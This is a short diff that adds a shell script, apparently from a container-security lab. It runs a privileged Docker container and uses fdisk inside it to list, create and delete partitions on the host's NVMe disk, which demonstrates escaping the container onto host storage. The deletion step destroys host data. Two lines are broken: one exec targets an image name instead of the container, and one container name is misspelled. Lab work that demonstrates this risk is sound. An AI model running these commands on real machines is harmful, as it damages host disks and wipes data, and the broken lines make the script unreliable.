@@ -1,0 +1,15 @@
+docker run -d --privileged --name partition-attack -p 80:80 isepdei/insecurelabs03
+
+docker exec isepdei/insecurelabs03 fdisk -l /dev/nvme0n1
+
+docker exec partition-attack sh -c 'printf "n\n\n\n\n+100M\nw\n" | fdisk /dev/nvme0n1'
+
+docker exec partition-attack fdisk -l /dev/nvme0n1
+
+sudo fdisk -l /dev/nvme0n1
+
+docker exec partition-attack sh -c 'printf "d\n3\nw\n" | fdisk /dev/nvme0n1'
+
+docker exec partition-attacl fdisk -l /dev/nvme0n1
+
+docker exec partition-attack fdisk -l /dev/nvme0n1
